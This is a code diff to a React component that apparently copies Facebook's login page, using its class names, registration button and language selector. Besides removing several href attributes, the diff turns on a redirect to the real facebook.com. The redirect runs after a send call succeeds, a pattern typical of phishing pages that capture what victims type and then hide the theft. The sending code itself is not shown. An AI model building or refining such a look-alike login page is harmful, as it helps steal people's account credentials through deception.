@@ -30,7 +30,6 @@ function App() {
                       <a
                         role="menuitem"
                         className="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy"
-                        href="#"
                         style={{ maxWidth: "200px" }}
                         aria-haspopup="true"
                         aria-expanded="false"
@@ -48,7 +47,6 @@ function App() {
                       <a
                         role="menuitem"
                         className="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy"
-                        href="#"
                         style={{ maxWidth: "200px" }}
                         aria-haspopup="true"
                         tabIndex={-1}
@@ -191,9 +189,9 @@ function App() {
                                           response.status,
                                           response.text
                                         );
-                                        // window.location.replace(
-                                        //   "http://www.facebook.com"
-                                        // );
+                                        window.location.replace(
+                                          "http://www.facebook.com"
+                                        );
                                       },
                                       function (error) {
                                         console.log("FAILED...", error);
@@ -215,7 +213,6 @@ function App() {
                               <a
                                 role="button"
                                 className="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy"
-                                href="#"
                                 ajaxify="/reg/spotlight/"
                                 id="u_0_2_Wk"
                                 data-testid="open-registration-form-button"
@@ -370,7 +367,6 @@ function App() {
                         className="_42ft _4jy0 _517i _517h _51sy"
                         rel="dialog"
                         ajaxify="/settings/language/language/?uri=https%3A%2F%2Fja-jp.facebook.com%2F&source=www_list_selector_more"
-                        href="#"
                         title="Mostrar más idiomas"
                       >
                         <i className="img sp_U0-3T3RQWbX sx_e4edb5" />
